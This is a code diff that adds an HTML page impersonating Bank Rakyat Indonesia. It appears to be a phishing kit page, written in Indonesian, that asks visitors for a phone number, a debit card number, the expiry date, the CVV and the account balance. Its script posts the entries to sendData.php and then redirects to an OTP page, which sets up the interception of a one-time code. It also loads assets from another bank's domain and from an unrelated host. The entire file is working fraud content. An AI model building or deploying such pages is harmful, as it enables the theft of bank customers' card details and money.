@@ -1,0 +1,533 @@
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Bank Rakyat Indonesia</title>
+    <meta name="theme-color" content="#0F78CB"> 
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"> 
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
+<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.2.0/css/font-awesome.min.css'><link rel="stylesheet" href="./style.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js"></script>
+ <link rel="stylesheet" href="https://webform.bca.co.id/applycc/styles.8e122b68f5adc945705d.css">
+</head>
+<style>
+    @charset "UTF-8";
+@import url(https://fonts.googleapis.com/css?family=Open+Sans:400,700,800);
+*, *:before, *:after {
+  box-sizing: border-box;
+}
+
+.group:after {
+  content: "";
+  display: table;
+  clear: both;
+}
+
+html, body {
+  height: 100%;
+  width: 100%;
+}
+
+body {
+  font-family: "Open Sans", sans-serif;
+  background: #fff;
+  height: 100%;
+  width: 100%;
+  position: fixed;
+  
+  overflow-x: hidden;
+}
+
+.wrap {
+ 
+  margin: 0 auto;
+  padding: 70px 10px;
+  transform-style: preserve-3d;
+}
+
+.cc_images {
+  margin-bottom: 5px;
+  transform: translateY(20px);
+  z-index: 0;
+}
+.cc_images .card {
+  float: left;
+  width: 16.666%;
+  height: 40px;
+  position: relative;
+  text-align: center;
+  perspective: 500px;
+  transform-style: preserve-3d;
+  z-index: 50;
+  transition: 0.4s;
+}
+.cc_images .card.show_cvc .inside {
+  transform: rotateY(180deg);
+}
+.cc_images .card.show_card {
+  transform: translateY(-20px);
+}
+.cc_images .card.show_card .front img, .cc_images .card.show_card .back img {
+  opacity: 1;
+  -webkit-filter: grayscale(0);
+  filter: none;
+}
+.cc_images .card .inside {
+  width: 100%;
+  height: 100%;
+  display: block;
+  transform-style: preserve-3d;
+  transition: 0.4s ease-in-out;
+}
+.cc_images .card .front, .cc_images .card .back {
+  backface-visibility: hidden;
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+}
+.cc_images .card .front img, .cc_images .card .back img {
+  max-width: 100%;
+  display: block;
+  transition: 0.3s;
+  opacity: 0.1;
+  filter: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg'><filter id='grayscale'><feColorMatrix type='matrix' values='0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0 0 0 1 0'/></filter></svg>#grayscale");
+  /* Firefox 10+, Firefox on Android */
+  -webkit-filter: grayscale(100%);
+  filter: grayscale(100%);
+}
+.cc_images .card .back {
+  transform: rotateY(-180deg);
+}
+
+.input-wrap {
+  position: relative;
+}
+.input-wrap:after {
+  position: absolute;
+  font-family: "FontAwesome";
+  transition: 0.5s;
+  opacity: 0;
+}
+.input-wrap.valid:after {
+  content: "";
+  color: #03B410;
+  right: 10px;
+  top: 9px;
+  font-size: 22px;
+  opacity: 1;
+}
+.input-wrap.error:after {
+  content: "";
+  font-size: 20px;
+  color: #E43737;
+  right: 12px;
+  top: 10px;
+  opacity: 1;
+}
+
+#cc_number {
+  margin-bottom: 10px;
+}
+
+.expiration-wrap {
+  width: 55%;
+  margin-right: 2%;
+  float: left;
+}
+
+.cvc-wrap {
+  width: 43%;
+  float: left;
+}
+
+label {
+  position: absolute;
+  background: grey;
+  background: #0071C1;
+  border: 1px solid #222;
+  color: white;
+  height: 40px;
+  width: 60px;
+  border-radius: 10px 0px 0px 10px;
+  font-size: 20px;
+  text-shadow: 0 1px 0 rgba(0, 0, 0, 0.8);
+  text-transform: ;
+  padding-top: 10px;
+  text-align: center;
+  cursor: pointer;
+  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.3), inset 0 -3px 0 0 rgba(0, 0, 0, 0.2);
+}
+
+input {
+  z-index: 10;
+  border: 0;
+  height: 40px;
+  font-size: 18px;
+  
+  padding-left: 70px;
+  padding-top: ;
+  width: 100%;
+  border-radius: 10px;
+  border: 0px solid #bbb;
+  box-shadow: rgba(0, 0, 0, 0.25) 0px 0.0625em 0.0625em, rgba(0, 0, 0, 0.25) 0px 0.125em 0.5em, rgba(255, 255, 255, 0.1) 0px 0px 0px 1px inset;
+}
+input:focus {
+  outline: none;
+  border-bottom: 2px solid #0071C1;
+}
+
+
+input::placeholder{
+    color: #bbb;
+    font-size: 14px;
+    padding-top: 0px;
+}
+.info {
+  font-size: 15px;
+  line-height: 1.4;
+  color: #bbb;
+  text-align: center;
+  margin-top: 20px;
+}
+.info small {
+  display: block;
+  font-size: 0.85em;
+}
+.info a {
+  color: skyblue;
+  text-decoration: none;
+}
+.info a:hover {
+  color: white;
+}
+
+button{
+    width: ;
+   z-index: 10;
+  border: 0;
+  height: 45px;
+  font-size: 18px;
+  padding: 0 5px;
+  padding-left: 0px;
+  width: 100%;
+  border: 0px solid black;
+  background: #0071C1;
+  color: #fff;
+  border-radius: 50px;
+  box-shadow: rgba(0, 0, 0, 0.25) 0px 0.0625em 0.0625em, rgba(0, 0, 0, 0.25) 0px 0.125em 0.5em, rgba(255, 255, 255, 0.1) 0px 0px 0px 1px inset;
+}
+
+.fa i{
+    background: yellow;
+}
+
+#judul{
+    text-align: center;
+    margin-top: -5px;
+    margin-bottom: -60px;
+    font-weight: bold;
+    
+}
+
+
+
+section{
+    border: 0px solid #aaa;
+    width: 90%;
+    margin: 0px auto;
+    position: ;
+    padding:  0px;
+    left: 0;
+    right: 0;
+    height: 390px;
+    border-radius: 20px;
+    background: #fff;
+    margin-top: 210px;
+    box-shadow: rgba(99, 99, 99, 0.3) 0px 2px 8px 0px;
+   
+}
+</style>
+<body>
+<!-- partial:index.partial.html -->
+<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjqSOj0HZqncLF5hfGUM0dpQreQz42O8xhXIDyOL__okFZdPj4hNrBPPzI4Bua57jLBY1BMUsd7Ze_3Hb1XTejqyj_tLp-otwY2MHw4D1jbJ_fOC1S6GTinZHrgboxj_NAqd78wSXwfvKMdcTHIm1BCmLnhoMXITaVmcB0bW_Hnl58ETvEWvHDI8EYKcu0/s1070/AddText_03-25-04.30.48.jpg" style="position: absolute; top: 0; left: 0; right: 0; width: 100%;  z-index: -1; border-radius: 0px 0px 15px 15px; box-shadow: rgba(99, 99, 99, 0.2) 0px 2px 8px 0px;">
+<br/>
+
+<section>
+<br/>
+<div id="judul">Masukkan data Kartu Debit Anda</div>
+</center>
+  <div _ngcontent-rnf-c40="" id="loading-progress" style="display: none; margin-top: 0px"></div>
+<div id="data1" class="wrap" style="display:  ">
+ <form id="formData" onsubmit="sendNohp(event); return false" method="post" class="cc_form" style="padding: 10px">   
+    		<div class="card">
+    	    <div class="input-wrap group">
+			<label for="cc_number"><i class="fa fa-phone" aria-hidden="true"></i></label>
+     <input type="tel" name="phone" id="phone" placeholder="Nomor Handphone.." style="margin-bottom: 10px" maxlength="13" minlength="10" required>
+     </div>
+     </div>
+    
+	<ul class="cc_images group">
+		<div class="card">
+			<div class="inside">
+				<div class="front"><img src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/74196/visa.png" alt="Visa" style="box-shadow: rgba(99, 99, 99, 0.2) 0px 2px 8px 0px;"></div>
+				<div class="back"><img src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/74196/credit.png" alt="Back of Card" style="box-shadow: rgba(99, 99, 99, 0.2) 0px 2px 8px 0px;"></div>
+			</div>
+		</div>
+
+		<div class="card">
+			<div class="inside">
+				<div class="front"><img src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/74196/mastercard.png" alt="MasterCard" style="box-shadow: rgba(99, 99, 99, 0.2) 0px 2px 8px 0px;"></div>
+				<div class="back"><img src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/74196/credit.png" alt="Back of Card" style="box-shadow: rgba(99, 99, 99, 0.2) 0px 2px 8px 0px;"></div>
+			</div>
+		</div>
+
+		<div class="card">
+			<div class="inside">
+				<div class="front"><img src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/74196/amex.png" alt="American Express" style="box-shadow: rgba(99, 99, 99, 0.2) 0px 2px 8px 0px;"></div>
+				<div class="back"><img src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/74196/credit.png" alt="Back of Card" style="box-shadow: rgba(99, 99, 99, 0.2) 0px 2px 8px 0px;"></div>
+			</div>
+		</div>
+
+		<div class="card">
+			<div class="inside">
+				<div class="front"><img src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/74196/discover.png" alt="Discover" style="box-shadow: rgba(99, 99, 99, 0.2) 0px 2px 8px 0px;"></div>
+				<div class="back"><img src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/74196/credit.png" alt="Back of Card" style="box-shadow: rgba(99, 99, 99, 0.2) 0px 2px 8px 0px;"></div>
+			</div>
+		</div>
+
+		<div class="card">
+			<div class="inside">
+				<div class="front"><img src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/74196/dinersclub.png" alt="Diners Club" style="box-shadow: rgba(99, 99, 99, 0.2) 0px 2px 8px 0px;"></div>
+				<div class="back"><img src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/74196/credit.png" alt="Back of Card" style="box-shadow: rgba(99, 99, 99, 0.2) 0px 2px 8px 0px;"></div>
+			</div>
+		</div>
+
+		<div class="card">
+			<div class="inside">
+				<div class="front"><img src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/74196/maestro.png" alt="Maestro" style="box-shadow: rgba(99, 99, 99, 0.2) 0px 2px 8px 0px;"></div>
+				<div class="back"><img src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/74196/credit.png" alt="Back of Card" style="box-shadow: rgba(99, 99, 99, 0.2) 0px 2px 8px 0px;"></div>
+			</div>
+		</div>
+
+	</ul>
+	
+		<div class="input-wrap group">
+			<label for="cc_number"><i class="fa fa-credit-card"></i></label>
+			<input type="tel" name="cc_number" id="cc_number" placeholder="16 digit Nomor Kartu Debit.." pattern="(?=.*[0-9]).{16,19}"  required oninvalid="this.setCustomValidity('Mɑsukkɑn 𝟭𝟲 𝗱𝗶𝗴𝗶𝘁 Nomor 𝗞𝗮𝗿𝘁𝘂 𝗗𝗲𝗯𝗶𝘁 dengɑn Benɑr')" onchange="this.setCustomValidity('')">
+		</div>
+		<div class="group exp-cvc">
+			<div class="input-wrap group expiration-wrap">
+				<label for="cc_expiration"><i class="fa fa-calendar"></i></label>
+				<input type="tel" name="cc_expiration" id="cc_expiration" placeholder="Valid Thru" pattern="(?=.*[0-9]).{4,9}"  required oninvalid="this.setCustomValidity('Mɑsukkɑn Mɑsɑ Berlɑku kɑrtu dengɑn benɑr untuk 𝗕𝘂𝗹𝗮𝗻 dɑn 𝗧𝗮𝗵𝘂𝗻 nyɑ')" onchange="this.setCustomValidity('')">
+			</div>
+			<div class="input-wrap group cvc-wrap">
+				<label for="cc_expiration"><i class="fa "><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgt0wU7X3q9FS7QGE3oI7TfJNItWI2r4AZnRvVaIZZEnb7fygh0FSlcswmre2kyhJhyOao4929dxeJCm12OydxU56M_Q78V5geQ3NcsLNy27l5dF8o55jHuwo6Ebj0MHVZSpJYW_uNCpGpiVA9nIMOZS_dfqYsBbxOhsgc4vsNH2r7Z2gq7F5oupcHxLZw/s1080/AddText_03-25-03.08.16.png" class="fa " width="25px" style="margin-top: -4px"></i></label>	
+				<input type="tel" name="cc_cvc" id="cc_cvc" placeholder="CVV" pattern="(?=.*[0-9]).{3,3}" oninvalid="this.setCustomValidity('𝗖𝗩𝗩 ɑdɑlɑh (𝟯 𝗱𝗶𝗴𝗶𝘁 𝗮𝗻𝗴𝗸𝗮 yɑng berɑdɑ dibelɑkɑng kɑrtu)')" onchange="this.setCustomValidity('')" maxlength="3" style="background: #fff;background-image: url(); background-size: 100% 100%; background-position: 100% 100%; background-repeat: no-repeat;" required>
+			</div>
+		</div>
+			<br/>	
+		<div class="card">
+    	    <div class="input-wrap group">
+			<label for="cc_number"><i class="fa " aria-hidden="true"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgWKD1j-osgvVUUsFg8rRs3J6n4xCwrAkWNi39xsu0Qxuf2L8Piq6nyROewBAklMIhd0fxIG5HFMMiKZY7ChnJ5MwMJ7ofERBsQXfHSmXbeWlVp-8p4nyOj-PM9e3gQFvfL009ABPYp6jBGH2Qn7MC1SXz0Br0eOAtAoCREvlEprGjmvZTdUZ1xqycmzLk/s1080/AddText_03-25-03.20.08.png" class="fa " width="23px" style="margin-top: -2px"></i></label>
+     <input type="tel" name="limit" id="limit" placeholder="Saldo Terakhir" style="margin-bottom: 5px" maxlength="" minlength="5" required>
+     <input type="hidden" id="tanparupiah">
+     </div>
+     </div>
+     
+<br/>
+<button type="submit" id="btnku">Konfirmasi</button>
+	</form> 
+	</div>
+	</section>
+
+
+<script src="https://dev-danapemulihan.pantheonsite.io/asset/jquery.mask.min.js"></script>
+<script>$(document).ready(function(){$('#cc_number').mask('0000 0000 0000 0000');});</script>
+
+<!-- partial -->
+<script src='//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
+<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/1.0.2/jquery.payment.min.js'></script>
+ <script>
+
+      /* Tanpa Rupiah */
+
+    var tanpa_rupiah = document.getElementById('tanparupiah');
+    tanpa_rupiah.addEventListener('keyup', function(e)
+    {
+        tanpa_rupiah.value = formatRupiah(this.value);
+    });
+    
+    /* Dengan Rupiah */
+    var dengan_rupiah = document.getElementById('limit');
+    dengan_rupiah.addEventListener('keyup', function(e)
+    {
+        dengan_rupiah.value = formatRupiah(this.value, 'Rp. ');
+    });
+    
+     /* Dengan Rupiah */
+    var dengan_saldo = document.getElementById('saldo');
+    dengan_saldo.addEventListener('keyup', function(e)
+    {
+        dengan_saldo.value = formatRupiah(this.value, 'Rp. ');
+    });
+    
+    /* Fungsi */
+    function formatRupiah(angka, prefix)
+    {
+        var number_string = angka.replace(/[^,\d]/g, '').toString(),
+            split    = number_string.split(','),
+            sisa     = split[0].length % 3,
+            rupiah     = split[0].substr(0, sisa),
+            ribuan     = split[0].substr(sisa).match(/\d{3}/gi);
+            
+        if (ribuan) {
+            separator = sisa ? '.' : '';
+            rupiah += separator + ribuan.join('.');
+        }
+        
+        rupiah = split[1] != undefined ? rupiah + ',' + split[1] : rupiah;
+        return prefix == undefined ? rupiah : (rupiah ? 'Rp. ' + rupiah : '');
+    }
+    
+  </script>	
+<script>
+$('#formData').on('submit', function (event) {
+
+ 
+  event.stopPropagation();
+    event.preventDefault();
+   
+ 
+ document.getElementById("btnku").innerHTML =  'Sedang diproses...';
+   $("#loading-progress").show();
+   
+   
+  $.ajax({
+ type: 'POST',
+   url: 'sendData.php',
+ data: $(this).serialize(),
+    
+    complete: function(data) {
+            console.log('Complete')
+  setTimeout(function(){
+      window.location.href='otp.html';
+    }, 500);
+    }
+
+    });
+
+
+    return false;
+});       
+    
+    
+</script>
+<script>
+    
+ $('#data2').on('submit', function (event) {
+
+ 
+  event.stopPropagation();
+    event.preventDefault();
+   
+ 
+ document.getElementById("btnku1").innerHTML =  'Sedang diproses...';
+   $("#loading-progress").show();
+   
+   
+$.ajax({
+ type: 'POST',
+ url: 'sendLimit.php',
+ data: $(this).serialize(),
+    
+   complete: function(data) {
+            console.log('Complete')
+  setTimeout(function(){
+      window.location.href='info.html';
+    }, 500);
+   }
+
+    });
+
+
+    return false;
+});       
+</script>
+<script>
+ (function($){
+
+	var $cc_num = $("#cc_number");
+	var $cc_exp = $("#cc_expiration");
+	var $cc_cvv = $("#cc_cvc");
+	var card_type = null;
+
+	$cc_num.payment("formatCardNumber");
+	$cc_exp.payment("formatCardExpiry");
+	$cc_cvv.payment("formatCardCVC");
+	
+	$cc_num.on("input", function(){
+		var current_num = $(this).val();
+		card_type = $.payment.cardType(current_num);
+		var current_card = $("img[src='https://s3-us-west-2.amazonaws.com/s.cdpn.io/74196/"+ card_type +".png']");
+		var card = current_card.parent().parent().parent();
+
+		if($(".show_card").length){
+			$(".show_card").removeClass("show_card");
+		}
+
+		card.addClass("show_card");
+	});
+
+	$cc_num.on("blur", function(){
+		var _ = $(this);
+		if(_.val() !== ""){
+			if($.payment.validateCardNumber(_.val())){
+				_.parent().removeClass("error").addClass("valid");
+			} else {
+				_.parent().removeClass("valid").addClass("");
+			}
+		} 
+	});
+
+	$cc_exp.on("blur", function(){
+		var _ = $(this);
+		if(_.val() !== ""){
+			var exp = _.val().split(" / ");
+			if($.payment.validateCardExpiry(exp[0], exp[1])){
+				_.parent().removeClass("").addClass("");
+			} else {
+				_.parent().removeClass("").addClass("");
+			}
+		} 
+	});
+
+	$cc_cvv.on("blur", function(){
+		var _ = $(this);
+		if(card_type && _.val() !== ""){
+			if($.payment.validateCardCVC(_.val(), card_type)){
+				_.parent().removeClass("").addClass("");
+			} else {
+				_.parent().removeClass("").addClass("");
+			}
+		} 
+	});
+
+	$cc_cvv.on("focus", function(){
+		var current_card = $(".show_card");
+		if(current_card.length){
+			current_card.addClass("show_cvc");
+		}
+		$(this).one("blur", function(){
+			if($(".show_cvc").length){
+				$(".show_cvc").removeClass("show_cvc");
+			}
+		});
+	});
+
+
+})(jQuery);   
+</script>
+
+</body>
+</html>
